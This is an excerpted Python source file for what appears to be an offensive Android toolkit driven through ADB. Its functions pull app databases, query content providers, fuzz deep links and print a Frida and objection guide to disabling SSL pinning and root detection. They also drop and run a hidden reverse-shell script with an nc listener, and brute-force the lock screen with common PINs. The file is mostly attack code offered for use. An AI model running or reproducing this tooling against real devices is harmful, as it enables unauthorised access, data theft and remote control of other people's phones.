...
def _run_adb(args, device_id=None, capture=True):
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += args
...
def launch_exported_activity(device_id: str, package: str, activity: str):
    ...
    out, rc = _run_adb(["shell", "am", "start", "-n", component], device_id)
    if rc == 0:
...
def extract_content_provider(device_id: str, uri: str):
    ...
    out, rc = _run_adb(["shell", "content", "query", "--uri", uri], device_id)
    if out:
        console.print(Panel(out[:2000], title=f"[bold]Provider Data: {uri}[/]", border_style="cyan"))
    else:
...
def deep_link_fuzzer(device_id: str, package: str, base_scheme: str, wordlist: list = None):
    ...
    console.print(f"\n[cyan]Fuzzing deep links: {base_scheme}:// ({len(wordlist)} paths)[/]")
    results = []
...
def frida_injection_guide(package: str):
    ...
    guide = f"""
[bold magenta]── Frida Injection Guide ─────────────────────────────────[/]

[bold cyan]1. Push Frida server to device (as root):[/]
   adb push frida-server /data/local/tmp/frida-server
   adb shell chmod 755 /data/local/tmp/frida-server
   adb shell /data/local/tmp/frida-server &

[bold cyan]2. Attach to running process:[/]
   frida -U -p $(adb shell pidof {package}) -l your_script.js

[bold cyan]3. Spawn and attach:[/]
   frida -U -f {package} -l your_script.js --no-pause

[bold cyan]4. SSL Pinning bypass (objection):[/]
   objection -g {package} explore
   android sslpinning disable

[bold cyan]5. Root detection bypass:[/]
   android root disable

[bold cyan]6. Dump all classes:[/]
   frida -U -f {package} -e "Java.perform(function(){{ Java.enumerateLoadedClasses({{ onMatch: c => console.log(c), onComplete: ()=>{{}} }}) }})"
    """
    console.print(Panel(guide, title="[bold]Frida Injection Guide[/]", border_style="magenta"))
...
def shell_payload_dropper(device_id: str, lhost: str, lport: int):
    ...
    console.print(Panel(
        f"[bold red]⚠  Dropping reverse shell payload[/]\n"
        f"LHOST: {lhost}  LPORT: {lport}\n\n"
        f"[bold cyan]Listener command (on your machine):[/]\n"
        f"  nc -lvnp {lport}\n\n"
        f"[bold cyan]Deploying via ADB...[/]",
        border_style="red"))

    script = f'#!/system/bin/sh\n{payload}\n'
    # Write script to device
    out, rc = _run_adb(["shell", f"echo '{script}' > /data/local/tmp/.pd_shell.sh"], device_id)
    out2, rc2 = _run_adb(["shell", "chmod 755 /data/local/tmp/.pd_shell.sh"], device_id)
    out3, rc3 = _run_adb(["shell", "nohup /data/local/tmp/.pd_shell.sh &"], device_id)
...
def extract_database(device_id: str, package: str, db_name: str, output_dir: str = "."):
    ...
    out, rc = _run_adb(["pull", remote, local], device_id)
    if rc == 0:
...
def bypass_lock_screen(device_id: str):
    ...
    # Wake device
    _run_adb(["shell", "input keyevent KEYCODE_WAKEUP"], device_id)
    time.sleep(0.5)
    # Swipe up
    _run_adb(["shell", "input swipe 540 1700 540 900 300"], device_id)
    time.sleep(0.5)
    # Try common PINs
    ...
    for pin in common_pins:
        for digit in pin:
            _run_adb(["shell", f"input keyevent KEYCODE_{digit}"], device_id)
            time.sleep(0.1)
        _run_adb(["shell", "input keyevent KEYCODE_ENTER"], device_id)
        time.sleep(0.3)
        # Check if unlocked
        state = _run_adb(["shell", "dumpsys window | grep mDreamingLockscreen"], device_id)[0]
...
def exploit_menu(device_id: str):
    ...
    t = Table(title="[bold red]💥 Exploit Engine[/]", box=box.DOUBLE_EDGE, border_style="red",
